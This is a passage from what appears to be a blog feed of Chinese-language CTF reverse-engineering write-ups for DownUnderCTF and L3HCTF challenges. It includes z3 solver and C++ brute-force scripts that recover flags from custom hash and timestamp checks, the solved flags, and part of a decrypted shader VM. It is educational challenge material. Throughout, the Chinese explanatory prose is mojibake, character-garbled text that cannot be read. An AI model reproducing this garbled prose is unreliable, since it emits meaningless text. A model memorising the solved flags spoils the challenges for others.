found.&quot;</span>)</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æœ‰ä¸ªå¤§å¾ªç¯ï¼Œè¿™è¾¹è·å–ç¬¬iä¸ªå’Œi+1ä¸ªä¸‹æ ‡ï¼Œiä»0å¼€å§‹ï¼Œæ­¥é•¿ä¸º2ï¼Œä½†å¯¹åº”çš„å­—ç¬¦ä¸²ä¸æ˜¯åŸå§‹çš„ï¼Œä¹Ÿæ˜¯æ‰“ä¹±åçš„ï¼Œæ‰€ä»¥è¿˜æ˜¯åŠ¨è°ƒçœ‹åˆ°åº•å–çš„å­—ç¬¦æ˜¯å¯¹åº”åŸå­—ç¬¦ä¸²çš„å“ªä¸ªä¸‹æ ‡ã€‚</p><p>åŠ¨è°ƒå‘ç°æ˜¯å–åŸå®Œæ•´å­—ç¬¦ä¸²p[22] p[23] p[24] p[25]å››ä¸ªå­—ç¬¦ä¸²ï¼Œä¸¤ä¸ªå­—ç¬¦ä¸€ç»„è¿›è¡Œä¸€æ¬¡å¾ªç¯ã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-58.png" alt="alt text"></p><p>è¿™è¾¹ç¬¬ä¸€å¤„å–p[i+1]ç„¶å-1ï¼Œç¬¬äºŒå¤„å–p[i]ç„¶å+1ã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-59.png" alt="alt text"></p><p><img src="/2025/07/21/DownUnderCTF2025/image-60.png" alt="alt text"></p><p>å°†ä¸¤ä¸ªæ•°æ®å…ˆåå¾€ååŠ å…¥å­—èŠ‚ï¼Œå¦‚ï¼šv212&#x3D;0x31ï¼Œv282&#x3D;0x71ï¼Œé‚£ä¹ˆæœ€åå¾€åæ·»åŠ å¾—åˆ°0x3171ã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-61.png" alt="alt text"></p><p>ä¸€å…±å››ä¸ªå­—èŠ‚ï¼Œåˆ†æˆä¸¤ç»„ï¼Œæœ€åå¾—åˆ°å››å­—èŠ‚ï¼Œè¿™è¾¹è¿›è¡Œæ¯”è¾ƒï¼Œé‚£ä¹ˆæŒ‰+1-1å°±å¯ä»¥ä»è¿™è¾¹è¿˜åŸå‡ºåŸæ¥çš„å››ä¸ªæ˜æ–‡å­—èŠ‚ã€‚</p><p>â€œ1qâ€æ˜¯ç¬¬ä¸€ç»„ï¼Œâ€e^â€æ˜¯ç¬¬äºŒç»„ï¼Œåˆ†åˆ«-1+1å¾—åˆ°â€0râ€ï¼Œâ€d_â€ï¼Œåˆèµ·æ¥å°±æ˜¯â€0rd_â€ï¼Œå¯¹åº”åŸå®Œæ•´å­—ç¬¦ä¸²p[22] p[23] p[24] p[25]å››ä¸ªå­—èŠ‚ã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-62.png" alt="alt text"></p><p>æœ€åä¸€ä¸ªæ ¡éªŒè¿˜æ˜¯z3ï¼ŒåŒæ ·å†™è„šæœ¬è§£æ–¹ç¨‹å³å¯ã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-63.png" alt="alt text"></p><p>z3è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p8 = Int(<span class="string">&#x27;p8&#x27;</span>)</span><br><span class="line">p12 = Int(<span class="string">&#x27;p12&#x27;</span>)</span><br><span class="line">p14 = Int(<span class="string">&#x27;p14&#x27;</span>)</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">s.add(p8 + <span class="number">2</span>*p12 + <span class="number">3</span>*p14 == <span class="number">552</span>)</span><br><span class="line">s.add(<span class="number">5</span>*p12 + <span class="number">4</span>*p8 + <span class="number">6</span>*p14 == <span class="number">1404</span>)</span><br><span class="line">s.add(<span class="number">6</span>*p8 + <span class="number">8</span>*p12 + <span class="number">9</span>*p14 == <span class="number">2145</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;p8 = <span class="subst">&#123;m[p8]&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;p12 = <span class="subst">&#123;m[p12]&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;p14 = <span class="subst">&#123;m[p14]&#125;</span>&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No solution found.&quot;</span>)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°â€oN_â€ä¸‰ä¸ªæ˜æ–‡å­—èŠ‚ï¼Œæ ¹æ®ä¸Šé¢æ‰€æœ‰æ ¡éªŒï¼Œç›®å‰å¯ä»¥å¾—åˆ°ä»¥ä¸‹å­—ç¬¦ä¸²ï¼š</p><blockquote><p>DUCTF{cho05iNg_?_p4s5W0rd_15_h4?dâ€¦}</p></blockquote><p>é—®å·æ˜¯æœªçŸ¥å­—èŠ‚ï¼Œè¿™ä¸¤ä¸ªæœªçŸ¥çš„å­—èŠ‚åœ¨å…¨ç¨‹æ²¡æœ‰è¢«æ ¡éªŒè¿‡ï¼Œä½†æ˜¯å¼€å¤´æœ‰å¯¹å»å‰åç¼€å­—ç¬¦ä¸²è¿›è¡Œçš„ä¸¤æ¬¡hashæ ¡éªŒï¼Œå¯ä»¥æ ¹æ®è¿™ä¸ªç‚¹æ¥çˆ†ç ´å‡ºå‰©ä¸‹çš„ä¸¤ä¸ªå­—èŠ‚ã€‚</p><p><img src="/2025/07/21/DownUnderCTF2025/image-64.png" alt="alt text"></p><h3 id="çˆ†ç ´è„šæœ¬"><a href="#çˆ†ç ´è„šæœ¬" class="headerlink" title="çˆ†ç ´è„šæœ¬"></a>çˆ†ç ´è„šæœ¬</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">T</span>&gt;</span><br><span class="line">T __ROL__(T value, <span class="type">int</span> count)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">uint32_t</span> nbits = <span class="built_in">sizeof</span>(T) * <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        count %= nbits;</span><br><span class="line">        T high = value &gt;&gt; (nbits - count);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">T</span>(<span class="number">-1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            high &amp;= ~((<span class="built_in">T</span>(<span class="number">-1</span>) &lt;&lt; count));</span><br><span class="line">        value &lt;&lt;= count;</span><br><span class="line">        value |= high;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        count = -count % nbits;</span><br><span class="line">        T low = value &lt;&lt; (nbits - count);</span><br><span class="line">        value &gt;&gt;= count;</span><br><span class="line">        value |= low;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">inline</span> DWORD64 __ROL8__(DWORD64 value, <span class="type">int</span> count) &#123; <span class="keyword">return</span> __ROL__((DWORD64)value, count); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// String.h()å‡½æ•°</span></span><br><span class="line"><span class="function">DWORD64 <span class="title">hash</span><span class="params">(<span class="type">uint8_t</span> *input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD64 v0 = <span class="number">0x811C9DC5LL</span>;</span><br><span class="line">    DWORD64 i&#123;&#125;;</span><br><span class="line">    <span class="type">uint8_t</span> v2 = input[<span class="number">0</span>];</span><br><span class="line">    <span class="type">int</span> c&#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">16777619</span>; c &lt; <span class="number">29</span>; v2 = input[c])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">auto</span> v5 = c + <span class="number">1</span>;</span><br><span class="line">        v0 = v2 ^ __ROL8__(v0, <span class="number">7</span>);</span><br><span class="line">        i = <span class="number">33</span> * i + v2 * v5;</span><br><span class="line">        c++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v0 ^ __ROL8__(i, <span class="number">32</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xffff</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line"><span class="comment">// è·å–ä¸¤ä¸ªçˆ†ç ´å­—èŠ‚</span></span><br><span class="line">        <span class="keyword">auto</span> a1 = i &amp; <span class="number">0xff</span>, a2 = (i &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">uint8_t</span> input1[] = <span class="string">&quot;cho05iNg_?_p4s5W0rd_15_h4?d..&quot;</span>;</span><br><span class="line">        input1[<span class="number">9</span>] = a1;</span><br><span class="line">        input1[<span class="number">25</span>] = a2;</span><br><span class="line">        <span class="keyword">auto</span> hash_result1 = <span class="built_in">hash</span>(input1) &amp; <span class="number">0xffffffff</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (hash_result1 == <span class="number">0xD890BAB5</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;hash1 correct!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç¬¬äºŒæ¬¡æ˜¯ç¿»è½¬åhash</span></span><br><span class="line">            <span class="type">uint8_t</span> input2[] = <span class="string">&quot;..dz4h_51_dr0W5s4p_j_gNi50ohc&quot;</span>;</span><br><span class="line">            input2[<span class="number">19</span>] = a1;</span><br><span class="line">            input2[<span class="number">3</span>] = a2;</span><br><span class="line">            <span class="keyword">auto</span> hash_result2 = <span class="built_in">hash</span>(input2) &gt;&gt; <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (hash_result2 == <span class="number">0x80DD5386</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;hash2 correct!\n&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;DUCTF&#123;%.29s.&#125;\n&quot;</span>, input1);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// DUCTF&#123;cho05iNg_A_p4s5W0rd_15_h4Rd...&#125;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>DUCTF{cho05iNg_A_p4s5W0rd_15_h4Rdâ€¦}</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;DownUnderCTF-Reverse-WP&quot;&gt;&lt;a href=&quot;#DownUnderCTF-Reverse-WP&quot; class=&quot;headerlink&quot; title=&quot;DownUnderCTF Reverse WP&quot;&gt;&lt;/a&gt;DownUnderCTF Reve</summary>
      
    
    
    
    
    <category term="CTFæ¯”èµ›" scheme="https://tkazer.github.io/tags/CTF%E6%AF%94%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>L3HCTF WP</title>
    <link href="https://tkazer.github.io/2025/07/14/L3HCTF/"/>
    <id>https://tkazer.github.io/2025/07/14/L3HCTF/</id>
    <published>2025-07-14T05:27:44.000Z</published>
    <updated>2025-07-15T02:59:41.174Z</updated>
    
    <content type="html"><![CDATA[<h1 id="L3HCTF-Reverse-WP"><a href="#L3HCTF-Reverse-WP" class="headerlink" title="L3HCTF Reverse WP"></a>L3HCTF Reverse WP</h1><p>æ”¾å‡ç”Ÿç‰©é’Ÿå·²ç»å€’è¿‡æ¥äº†ï¼Œæ¯å¤©æ—©ä¸Š10ç‚¹éƒ½èµ·ä¸æ¥ï¼Œéƒ½æ˜¯ä¸‹åˆ1-2ç‚¹èµ·åºŠåšé¢˜ï¼Œå…¨ç¨‹å°±æ‹¿äº†snakeçš„2è¡€ï¼Œå…¶ä»–çš„éƒ½å› ä¸ºç”Ÿç‰©é’Ÿæ²¡äº‰å–åˆ°ğŸ˜¢ï¼Œè¿™æ¬¡çš„XCTFå¼ºåº¦ä¸é«˜ï¼Œéƒ½æ˜¯å¯ä»¥åšçš„ã€‚</p><h2 id="TemporalParadox"><a href="#TemporalParadox" class="headerlink" title="TemporalParadox"></a>TemporalParadox</h2><p>é€šè¿‡å­—ç¬¦ä¸²äº¤å‰è°ƒç”¨æ‰¾åˆ°mainå‡½æ•°ï¼ŒIDAæ— æ³•F5åç¼–è¯‘ï¼ŒåŒ…å«äº†è®¸å¤šå¼‚å¸¸ã€‚ç›´æ¥Deleteå‡½æ•°ï¼Œç„¶åå¿½ç•¥å¼€å¤´è¿™äº›æ±‡ç¼–ï¼Œä»ä¸‹é¢çš„å¼€å§‹æŒ‰Pè¿˜åŸå‡½æ•°å°±å¯ä»¥F5åç¼–è¯‘ã€‚</p><p><img src="/2025/07/14/L3HCTF/image.png" alt="alt text"></p><p>ä¸€äº›å‚æ•°ä¸ç¡®å®šã€ç”±æŒ‡é’ˆè°ƒç”¨è¡¨ç¤ºçš„å‡½æ•°ï¼Œéƒ½å¯ä»¥ç›´æ¥è·³è½¬åˆ°å¯¹åº”å‡½æ•°æŒ‰F5ï¼Œå†è½¬å›mainï¼Œå†æŒ‰F5è®©IDAé‡æ–°è¯†åˆ«ã€‚</p><p>è¿™è¾¹å¼€å¤´æ˜¯åˆ¤æ–­äº†æ—¶é—´æˆ³æ˜¯å¦åœ¨æŸä¸ªèŒƒå›´å†…ï¼Œç„¶åæ‰§è¡Œé‡Œé¢çš„ä»£ç ã€‚</p><p><img src="/2025/07/14/L3HCTF/image-1.png" alt="alt text"></p><p>åº•ä¸‹è¦æ±‚è¾“å…¥queryï¼Œç„¶åMD5ååˆ¤æ–­æ˜¯å¦ä¸ç›®æ ‡å€¼ç›¸ç­‰ï¼Œé‚£è¿™è¾¹ä¸»è¦å°±ç ”ç©¶ä¸Šé¢æ—¶é—´æˆ³èŒƒå›´å†…æ‰§è¡Œçš„ä»£ç ã€‚</p><p><img src="/2025/07/14/L3HCTF/image-2.png" alt="alt text"></p><p>æ—¶é—´æˆ³èŒƒå›´å†…æ‰§è¡Œä»£ç çš„ç¬¬ä¸€ä¸ªå‡½æ•°è¿›æ¥å‘ç°å°±æ˜¯æ„é€ queryçš„åœ°æ–¹ã€‚</p><p><img src="/2025/07/14/L3HCTF/image-3.png" alt="alt text"></p><p>å°†è·å–çš„æ—¶é—´æˆ³ä¼ å…¥å‡½æ•°ï¼Œèµ‹å€¼ç»™ä¸€ä¸ªå…¨å±€å˜é‡ã€‚</p><p><img src="/2025/07/14/L3HCTF/image-4.png" alt="alt text"></p><p>ç„¶åå¾ªç¯è°ƒç”¨ä¸€ä¸ªå‡½æ•°è¿›è¡Œè®¡ç®—ï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯åˆ©ç”¨åˆšåˆšé‚£ä¸ªå…¨å±€å˜é‡è¿›è¡Œçš„è®¡ç®—ï¼Œæœ€åç»™v45ã€v48ã€v49ã€v50ã€v51èµ‹å€¼ã€‚</p><p><img src="/2025/07/14/L3HCTF/image-5.png" alt="alt text"></p><p><img src="/2025/07/14/L3HCTF/image-6.png" alt="alt text"></p><p>é€šè¿‡ä¸¤ä¸ªå…¨å±€é™æ€å€¼ä»¥åŠåˆšåˆšä¸Šé¢å¾—åˆ°çš„å€¼è¿›è¡Œè®¡ç®—ï¼Œæœ€åæ¯”è¾ƒä¸¤ä¸ªè®¡ç®—å€¼æ˜¯å¦ç›¸ç­‰ï¼Œç„¶åèµ°ä¸åŒçš„queryæ„é€ ä»£ç ã€‚</p><p><img src="/2025/07/14/L3HCTF/image-7.png" alt="alt text"></p><p>ç”±äºå…¨ç¨‹è®¡ç®—ä»…ä»…ç”±æ—¶é—´æˆ³æ§åˆ¶ï¼Œå¹¶ä¸”å·²ç»ç»™å‡ºæ—¶é—´æˆ³èŒƒå›´ï¼Œå°±å¯ä»¥é‡‡ç”¨æ—¶é—´æˆ³çˆ†ç ´æ–¹æ³•æ¥çˆ†ç ´ç¬¦å·ç›®æ ‡MD5çš„queryå­—ä¸²ã€‚</p><p>çº¢æ¡†å¤„æ˜¯å‚æ•°å€¼å¯¹åº”çš„å˜é‡ï¼Œsaltæ˜¯å›ºå®šçš„å¯ä»¥ç›´æ¥è°ƒè¯•å–åˆ°ï¼Œ<strong>tlkyeueq7fej8vtzitt26yl24kswrgm5</strong></p><p><img src="/2025/07/14/L3HCTF/image-8.png" alt="alt text"></p><h3 id="è§£å¯†ä»£ç "><a href="#è§£å¯†ä»£ç " class="headerlink" title="è§£å¯†ä»£ç "></a>è§£å¯†ä»£ç </h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;md5.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">DWORD dword_7FF72F33B040 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 <span class="title">sub_7FF72F3314D5</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">    v1 = (((dword_7FF72F33B040 &lt;&lt; <span class="number">13</span>) ^ (<span class="type">unsigned</span> <span class="type">int</span>)dword_7FF72F33B040) &gt;&gt; <span class="number">17</span>)</span><br><span class="line">        ^ (dword_7FF72F33B040 &lt;&lt; <span class="number">13</span>)</span><br><span class="line">        ^ dword_7FF72F33B040;</span><br><span class="line">    dword_7FF72F33B040 = (<span class="number">32</span> * v1) ^ v1;</span><br><span class="line">    <span class="keyword">return</span> dword_7FF72F33B040 &amp; <span class="number">0x7FFFFFFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (DWORD c = <span class="number">1751990400</span>; c &lt;= <span class="number">1752052051</span>; c++)</span><br><span class="line">    &#123;</span><br><span class="line">        dword_7FF72F33B040 = c;</span><br><span class="line">        DWORD v45, v48, v49, v50, v51;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; (<span class="type">int</span>)<span class="built_in">sub_7FF72F3314D5</span>(); ++i)</span><br><span class="line">        &#123;</span><br><span class="line">            v51 = <span class="built_in">sub_7FF72F3314D5</span>();</span><br><span class="line">            v50 = <span class="built_in">sub_7FF72F3314D5</span>();</span><br><span class="line">            v49 = <span class="built_in">sub_7FF72F3314D5</span>();</span><br><span class="line">            v48 = <span class="built_in">sub_7FF72F3314D5</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        v45 = <span class="built_in">sub_7FF72F3314D5</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> Buf[<span class="number">1024</span>]&#123;&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sprintf</span>(Buf, <span class="string">&quot;salt=tlkyeueq7fej8vtzitt26yl24kswrgm5&amp;t=%d&amp;r=%d&amp;a=%d&amp;b=%d&amp;x=%d&amp;y=%d&quot;</span>, c, v45, v51, v50, v49, v48);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">auto</span> md5Txt = <span class="built_in">MD5</span>(Buf).<span class="built_in">toStr</span>();</span><br><span class="line">        <span class="keyword">if</span> (md5Txt == <span class="string">&quot;8a2fc1e9e2830c37f8a7f51572a640aa&quot;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;time:%X\n&quot;</span>, c);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, Buf);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">time:686D4FA5</span></span><br><span class="line"><span class="comment">salt=tlkyeueq7fej8vtzitt26yl24kswrgm5&amp;t=1751994277&amp;r=101356418&amp;a=1388848462&amp;b=441975230&amp;x=1469980073&amp;y=290308156</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>SHA1(query) &#x3D; 5cbbe37231ca99bd009f7eb67f49a98caae2bb0f</p><p>L3HCTF{5cbbe37231ca99bd009f7eb67f49a98caae2bb0f}</p><h2 id="ç»ˆç„‰ä¹‹é—¨"><a href="#ç»ˆç„‰ä¹‹é—¨" class="headerlink" title="ç»ˆç„‰ä¹‹é—¨"></a>ç»ˆç„‰ä¹‹é—¨</h2><p>OpenGLç¨‹åºï¼Œæ ¸å¿ƒä»£ç åœ¨ç€è‰²å™¨ä»£ç é‡Œé¢ï¼Œæ–­ç‚¹æ­¤å¤„å°±å¯ä»¥å¾—åˆ°è§£å¯†åçš„ç€è‰²å™¨ä»£ç ï¼Œ</p><p><img src="/2025/07/14/L3HCTF/image-9.png" alt="alt text"></p><p>ç€è‰²å™¨ä»£ç ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#version 430 core</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">layout</span>(local_size_x = <span class="number">1</span>, local_size_y = <span class="number">1</span>, local_size_z = <span class="number">1</span>) in;</span><br><span class="line"><span class="built_in">layout</span>(std430, binding = <span class="number">0</span>) buffer OpCodes  &#123; <span class="type">int</span> opcodes[]; &#125;;</span><br><span class="line"><span class="built_in">layout</span>(std430, binding = <span class="number">2</span>) buffer CoConsts &#123; <span class="type">int</span> co_consts[]; &#125;;</span><br><span class="line"><span class="built_in">layout</span>(std430, binding = <span class="number">3</span>) buffer Cipher   &#123; <span class="type">int</span> cipher[<span class="number">16</span>]; &#125;;</span><br><span class="line"><span class="built_in">layout</span>(std430, binding = <span class="number">4</span>) buffer Stack    &#123; <span class="type">int</span> stack_data[<span class="number">256</span>]; &#125;;</span><br><span class="line"><span class="built_in">layout</span>(std430, binding = <span class="number">5</span>) buffer Out      &#123; <span class="type">int</span> verdict;         &#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MaxInstructionCount = <span class="number">1000</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (gl_GlobalInvocationID.x &gt; <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    uint ip = <span class="number">0u</span>;</span><br><span class="line">    <span class="type">int</span> sp = <span class="number">0</span>;</span><br><span class="line">    verdict = <span class="number">-233</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (ip &lt; <span class="built_in">uint</span>(MaxInstructionCount))</span><br><span class="line">    